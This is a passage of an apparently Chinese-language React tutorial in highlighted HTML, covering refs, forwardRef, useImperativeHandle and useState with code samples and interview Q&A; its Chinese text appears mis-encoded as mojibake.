class="hljs-params"></span>) =&gt; <span class="hljs-built_in">clearInterval</span>(intervalRef.<span class="hljs-property">current</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;count&#125; <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;stop&#125;</span>&gt;</span>åœæ­¢<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç±»ç»„ä»¶æ–¹æ³•è°ƒç”¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å­ç»„ä»¶ï¼ˆç±»ç»„ä»¶ï¼‰</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AudioPlayer</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  play = <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">audio</span>.<span class="hljs-title function_">play</span>();<br>  pause = <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">audio</span>.<span class="hljs-title function_">pause</span>();<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;el</span> =&gt;</span> this.audio = el&#125; /&gt;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// çˆ¶ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> playerRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">AudioPlayer</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;playerRef&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> playerRef.current.play()&#125;&gt;æ’­æ”¾<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç¬¬ä¸‰æ–¹åº“é›†æˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ChartContainer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> chartRef = <span class="hljs-title function_">useRef</span>();<br>  <span class="hljs-keyword">const</span> chartInstance = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// åˆå§‹åŒ–å›¾è¡¨</span><br>    chartInstance.<span class="hljs-property">current</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThirdPartyChart</span>(chartRef.<span class="hljs-property">current</span>, data);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> chartInstance.<span class="hljs-property">current</span>.<span class="hljs-title function_">destroy</span>();  <span class="hljs-comment">// æ¸…ç†</span><br>  &#125;, [data]);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;chartRef&#125;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">height:</span> &#x27;<span class="hljs-attr">400px</span>&#x27; &#125;&#125; /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="forwardRef-è½¬å‘æœºåˆ¶"><a href="#forwardRef-è½¬å‘æœºåˆ¶" class="headerlink" title="forwardRef è½¬å‘æœºåˆ¶"></a>forwardRef è½¬å‘æœºåˆ¶</h3><p><strong>é—®é¢˜èƒŒæ™¯ï¼šå‡½æ•°ç»„ä»¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ ref</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ é”™è¯¯ç”¨æ³•ï¼šå‡½æ•°ç»„ä»¶æ— å®ä¾‹</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">MyInput</span> = (<span class="hljs-params">&#123; value &#125;</span>) =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span> /&gt;</span></span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>();<br>  <span class="hljs-comment">// æ— æ•ˆï¼inputRef.current å°†ä¸º null</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">MyInput</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>forwardRef è§£å†³æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyInput</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">(<span class="hljs-params">props, ref</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> &#123;<span class="hljs-attr">...props</span>&#125; <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;ref&#125;</span> /&gt;</span></span>;<br>&#125;);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();  <span class="hljs-comment">// âœ… ç°åœ¨å¯ä»¥æ“ä½œ DOM</span><br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">MyInput</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è½¬å‘å¤šä¸ª ref</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MultiInput</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">(<span class="hljs-params">props, ref</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> input1Ref = <span class="hljs-title function_">useRef</span>();<br>  <span class="hljs-keyword">const</span> input2Ref = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-comment">// åˆå¹¶ ref åˆ°çˆ¶ç»„ä»¶</span><br>  <span class="hljs-title function_">useImperativeHandle</span>(ref, <span class="hljs-function">() =&gt;</span> (&#123;<br>    <span class="hljs-attr">focusFirst</span>: <span class="hljs-function">() =&gt;</span> input1Ref.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>(),<br>    <span class="hljs-attr">focusSecond</span>: <span class="hljs-function">() =&gt;</span> input2Ref.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>()<br>  &#125;));<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;input1Ref&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;input2Ref&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;);<br><br><span class="hljs-comment">// çˆ¶ç»„ä»¶ä½¿ç”¨</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputsRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">MultiInput</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputsRef&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> inputsRef.current.focusFirst()&#125;&gt;èšç„¦è¾“å…¥1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="useImperativeHandle-é«˜çº§ç”¨æ³•"><a href="#useImperativeHandle-é«˜çº§ç”¨æ³•" class="headerlink" title="useImperativeHandle é«˜çº§ç”¨æ³•"></a>useImperativeHandle é«˜çº§ç”¨æ³•</h3><p><strong>æš´éœ²è‡ªå®šä¹‰æ–¹æ³•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">FancyInput</span> = <span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">(<span class="hljs-params">props, ref</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useImperativeHandle</span>(ref, <span class="hljs-function">() =&gt;</span> (&#123;<br>    <span class="hljs-comment">// æš´éœ²ç‰¹å®šæ–¹æ³•</span><br>    <span class="hljs-attr">focus</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>      inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();<br>    &#125;,<br>    <span class="hljs-attr">scrollIntoView</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>      inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">scrollIntoView</span>();<br>    &#125;,<br>    <span class="hljs-comment">// é™åˆ¶è®¿é—® DOM èŠ‚ç‚¹</span><br>    <span class="hljs-attr">getValue</span>: <span class="hljs-function">() =&gt;</span> inputRef.<span class="hljs-property">current</span>.<span class="hljs-property">value</span><br>  &#125;));<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span>;<br>&#125;);<br><br><span class="hljs-comment">// çˆ¶ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">FancyInput</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> inputRef.current.focus()&#125;&gt;èšç„¦<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> console.log(inputRef.current.getValue())&#125;&gt;è·å–å€¼<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¾èµ–é¡¹æ§åˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useImperativeHandle</span>(ref, <span class="hljs-function">() =&gt;</span> (&#123;<br>  <span class="hljs-comment">// å½“ value å˜åŒ–æ—¶æ›´æ–°æ–¹æ³•</span><br>  <span class="hljs-attr">getValue</span>: <span class="hljs-function">() =&gt;</span> inputRef.<span class="hljs-property">current</span>.<span class="hljs-property">value</span><br>&#125;), [props.<span class="hljs-property">value</span>]);  <span class="hljs-comment">// ä¾èµ–é¡¹æ•°ç»„</span><br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-5"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-5" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆå‡½æ•°ç»„ä»¶é»˜è®¤ä¸èƒ½ä½¿ç”¨ refï¼Ÿ</strong></p><ul><li>å‡½æ•°ç»„ä»¶æ— å®ä¾‹ï¼Œref æ— æ³•æŒ‡å‘ç»„ä»¶å¯¹è±¡</li><li>React è®¾è®¡å“²å­¦ï¼šé¿å…ç›´æ¥æ“ä½œå­ç»„ä»¶</li><li>è§£å†³æ–¹æ¡ˆï¼šforwardRef + useImperativeHandle</li></ul><p><strong>Qï¼šuseRef å’Œ useState æœ‰ä½•åŒºåˆ«ï¼Ÿ</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">useRef</th><th align="left">useState</th></tr></thead><tbody><tr><td align="left">è§¦å‘é‡æ¸²æŸ“</td><td align="left">å¦</td><td align="left">æ˜¯</td></tr><tr><td align="left">å­˜å‚¨å€¼ç±»å‹</td><td align="left">å¯å˜å¯¹è±¡ï¼ˆ.currentï¼‰</td><td align="left">ä¸å¯å˜çŠ¶æ€</td></tr><tr><td align="left">æ•°æ®æŒä¹…åŒ–</td><td align="left">ç»„ä»¶ç”Ÿå‘½å‘¨æœŸ</td><td align="left">çŠ¶æ€æ›´æ–°ä¿ç•™</td></tr><tr><td align="left">å…¸å‹ç”¨é€”</td><td align="left">DOM å¼•ç”¨&#x2F;è®¡æ—¶å™¨ ID</td><td align="left">æ¸²æŸ“ç›¸å…³çŠ¶æ€</td></tr></tbody></table><p><strong>Qï¼šå›è°ƒ Ref æœ‰ä½•ç‰¹æ®Šç”¨é€”ï¼Ÿ</strong></p><p>(1) åŠ¨æ€ç»‘å®šï¼šå¯åœ¨è¿è¡Œæ—¶åˆ‡æ¢ ref ç›®æ ‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;input ref=&#123;condition ? ref1 : ref2&#125; /&gt;<br></code></pre></td></tr></table></figure><p>(2) ç²¾ç»†æ§åˆ¶ï¼šå…ƒç´ æŒ‚è½½&#x2F;å¸è½½æ—¶æ‰§è¡Œé€»è¾‘</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">measureRef</span> = (<span class="hljs-params">el</span>) =&gt; &#123;<br>  <span class="hljs-keyword">if</span> (el) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;å°ºå¯¸:&#x27;</span>, el.<span class="hljs-title function_">getBoundingClientRect</span>());<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“ï¼šRefs-ä½¿ç”¨å†³ç­–"><a href="#æ€»ç»“ï¼šRefs-ä½¿ç”¨å†³ç­–" class="headerlink" title="æ€»ç»“ï¼šRefs ä½¿ç”¨å†³ç­–"></a>æ€»ç»“ï¼šRefs ä½¿ç”¨å†³ç­–</h3><pre class="mermaid">graph TD  A[æ˜¯å¦éœ€è¦æ“ä½œ DOM?] -->|æ˜¯| B[ä½¿ç”¨ Ref]  A -->|å¦| C[è€ƒè™‘ State]  B --> D{ç»„ä»¶ç±»å‹?}  D -->|å‡½æ•°ç»„ä»¶| E[useRef + forwardRef]  D -->|ç±»ç»„ä»¶| F[createRef]  B --> G{éœ€è¦æš´éœ²æ–¹æ³•?}  G -->|æ˜¯| H[useImperativeHandle]  G -->|å¦| I[ç›´æ¥è®¿é—® DOM]</pre><h1 id="ç¬¬ä¸‰ç« ï¼šHooks-æ·±åº¦è§£æ"><a href="#ç¬¬ä¸‰ç« ï¼šHooks-æ·±åº¦è§£æ" class="headerlink" title="ç¬¬ä¸‰ç« ï¼šHooks æ·±åº¦è§£æ"></a>ç¬¬ä¸‰ç« ï¼šHooks æ·±åº¦è§£æ</h1><h2 id="3-1-useState-ä¸çŠ¶æ€ç®¡ç†"><a href="#3-1-useState-ä¸çŠ¶æ€ç®¡ç†" class="headerlink" title="3.1 useState ä¸çŠ¶æ€ç®¡ç†"></a>3.1 useState ä¸çŠ¶æ€ç®¡ç†</h2><h3 id="åŸºç¡€æ¦‚å¿µæ¦‚è¿°-4"><a href="#åŸºç¡€æ¦‚å¿µæ¦‚è¿°-4" class="headerlink" title="åŸºç¡€æ¦‚å¿µæ¦‚è¿°"></a>åŸºç¡€æ¦‚å¿µæ¦‚è¿°</h3><p><strong>useState ä½œç”¨</strong>ï¼šå‡½æ•°ç»„ä»¶ä¸­æ·»åŠ çŠ¶æ€èƒ½åŠ›çš„ Hookï¼Œæ›¿ä»£ç±»ç»„ä»¶çš„ this.state</p><p>åŸºæœ¬è¯­æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialValue);<br></code></pre></td></tr></table></figure><ul><li>stateï¼šå½“å‰çŠ¶æ€å€¼</li><li>setStateï¼šçŠ¶æ€æ›´æ–°å‡½æ•°</li><li>initialValueï¼šåˆå§‹çŠ¶æ€ï¼ˆæ”¯æŒæƒ°æ€§åˆå§‹åŒ–ï¼‰</li></ul><h3 id="æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ-2"><a href="#æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ-2" class="headerlink" title="æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ"></a>æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ</h3><p><strong>é—­åŒ…çŠ¶æ€å¿«ç…§åŸç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>);   <span class="hljs-comment">// é—­åŒ…æ•è·å½“å‰ count å€¼</span><br>    <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count);    <span class="hljs-comment">// è¾“å‡ºæ—§å€¼ï¼ˆçŠ¶æ€æ›´æ–°æ˜¯å¼‚æ­¥çš„ï¼‰</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;increment&#125;</span>&gt;</span>&#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…³é”®ç‰¹æ€§ï¼š</p><ul><li>æ¯æ¬¡æ¸²æŸ“éƒ½æœ‰ç‹¬ç«‹çš„å‡½æ•°ä½œç”¨åŸŸ</li><li>çŠ¶æ€æ›´æ–°å‡½æ•°è°ƒç”¨æ—¶ä½¿ç”¨å½“æ¬¡æ¸²æŸ“çš„å¿«ç…§å€¼</li><li>çŠ¶æ€æ›´æ–°è§¦å‘é‡æ–°æ¸²æŸ“ï¼ˆç”Ÿæˆæ–°çš„é—­åŒ…ï¼‰</li></ul><p><strong>å‡½æ•°å¼æ›´æ–°è§£å†³é—­åŒ…é™·é˜±</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ é—­åŒ…é™·é˜±ï¼ˆè¿ç»­ç‚¹å‡»åªå¢åŠ 1ï¼‰</span><br><span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>);<br><span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// âœ… å‡½æ•°å¼æ›´æ–°ï¼ˆè¿ç»­ç‚¹å‡»å¢åŠ 2ï¼‰</span><br><span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);<br><span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>åŸç†ï¼šæ›´æ–°å‡½æ•°æ¥æ”¶ previous state å‚æ•°ï¼ŒReact ä¿è¯è¿™æ˜¯æœ€æ–°çŠ¶æ€</p><p><strong>çŠ¶æ€æ‰¹å¤„ç†æœºåˆ¶ï¼ˆReact 18+ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c + <span class="hljs-number">1</span>);<br>  <span class="hljs-title function_">setFlag</span>(<span class="hljs-function"><span class="hljs-params">f</span> =&gt;</span> !f);<br>  <span class="hljs-comment">// React 18ï¼šè‡ªåŠ¨æ‰¹å¤„ç†ä¸ºå•æ¬¡æ¸²æŸ“</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>äº‹ä»¶å¾ªç¯ä¸­çš„è¡¨ç°ï¼š</p><pre class="mermaid">sequenceDiagram  participant UI as ç”¨æˆ·ç•Œé¢  participant React as React è¿è¡Œæ—¶  UI->>React: è§¦å‘äº‹ä»¶  React->>React: æ‰§è¡Œæ‰€æœ‰ setState  React->>React: åˆå¹¶çŠ¶æ€æ›´æ–°  React->>UI: å•æ¬¡é‡æ¸²æŸ“</pre><p><strong>æƒ°æ€§åˆå§‹åŒ–ï¼ˆLazy Initializationï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âœ… é¿å…é‡å¤è®¡ç®—åˆå§‹å€¼</span><br><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> initialState = <span class="hljs-title function_">computeExpensiveValue</span>(props);<br>  <span class="hljs-keyword">return</span> initialState;<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>åˆå§‹åŒ–å‡½æ•°ä»…åœ¨æŒ‚è½½æ—¶æ‰§è¡Œä¸€æ¬¡</li><li>é¿å…é‡æ–°æ¸²æŸ“æ—¶é‡å¤è®¡ç®—</li></ul><h3 id="çŠ¶æ€ç®¡ç†è¿›é˜¶æ¨¡å¼"><a href="#çŠ¶æ€ç®¡ç†è¿›é˜¶æ¨¡å¼" class="headerlink" title="çŠ¶æ€ç®¡ç†è¿›é˜¶æ¨¡å¼"></a>çŠ¶æ€ç®¡ç†è¿›é˜¶æ¨¡å¼</h3><p><strong>çŠ¶æ€ä¾èµ–æ›´æ–°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// å½“ count å˜åŒ–æ—¶é‡ç½® page</span><br>  <span class="hljs-title function_">setPage</span>(<span class="hljs-number">1</span>);<br>&#125;, [count]); <span class="hljs-comment">// ä¾èµ–é¡¹è§¦å‘çŠ¶æ€é‡ç½®</span><br></code></pre></td></tr></table></figure><p><strong>çŠ¶æ€æå‡ä¸ä¸‹æ²‰ç­–ç•¥</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 